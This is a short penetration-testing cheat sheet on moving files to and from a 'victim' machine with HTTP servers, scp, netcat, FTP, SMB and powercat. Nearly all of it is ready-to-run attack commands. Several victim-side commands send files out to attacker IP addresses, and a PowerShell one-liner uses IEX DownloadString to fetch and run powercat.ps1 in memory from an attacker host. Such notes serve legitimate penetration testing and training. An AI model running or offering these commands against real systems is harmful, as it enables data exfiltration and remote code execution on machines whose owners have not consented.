# File-Transfer
## ****Upload files to the victim****

### ****Simple HTTP Server****

- Attacking machine command:
    
    `python -m SimpleHTTPServer 80`
    
    - Victim machine command:
    
     `wget http://192.168.1.35/FiletoTransfer`
    
    or
    

       `curl -o <FiletoTransfer> http://192.168.1.35/FiletoTransfer`

### **SCP(SSH utility)**

This method will only be valid if the target machine has ssh and we have the credentials.

- Attacking machine command:

`scp` `FiletoTransfer> tester@192.168.1.39:/home/tester/iron/`

### ****Netcat****

Victim machine command:

`nc` `-lvp 4444 > FiletoTransfer`

Attacking machine command:

`nc` `192.168.1.39 4444 -w 3 < FiletoTransfer`

### ****FTP****

Attacking machine command:

`twistd -n ftp` `-r .`

Victim machine command:

`wget ftp://192.168.1.35:2121/FiletoTransfer`

## ****Download victim files****

### ****FTP****

Attacking machine command:

`python -m pyftpdlib -w`

Victim machine command:

`ftp`

`open` `10.10.10.1 2121`

`anonymous`

`put FiletoDownload`

`bye`

### ****Netcat****

Attacking machine command:

`nc` `-lvp 4444 > FiletoDownload`

Victim machine command:

`nc.exe 10.10.10.1 4444 -w 3 < FiletoDownload`

### ****SMB****

Through impacket-smbserver we will mount a smb folder on our machine that we will access from the victim machine to copy the file to be downloaded in our SMB folder

Attacking machine command:

`impacket-smbserver -smb2support test` `.`

Victim machine command:

`copy  FiletoDownload \\10.10.10.1:8080\FiletoDownload`

### ****Powercat****

In this method we will load in memory the powercat module, a tool with which we can load a shell, send files. In this case we will use it for this same.

We have the powercat.ps1 file hosted on our machine and load it using the DownloadString function. We execute powercat to send the file and through wget we download it in our machine.

We will see that the download never ends but we will cancel it when it may have finished depending on the size of the file.

- Victim machine command:1`powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.1/powercat.ps1');powercat -l -p 4444 -i C:\Users\test\FiletoDownload"`Attacking machine command:1`wget http://10.10.10.2:4444/FiletoDownload`

Tools:

[netcat](http://netcat.sourceforge.net/), [impacket](https://github.com/CoreSecurity/impacket), [pyftpdlib](https://github.com/giampaolo/pyftpdlib), [powercat](https://github.com/besimorhino/powercat), [twistd](https://twistedmatrix.com/documents/17.5.0/core/howto/basics.html#application)
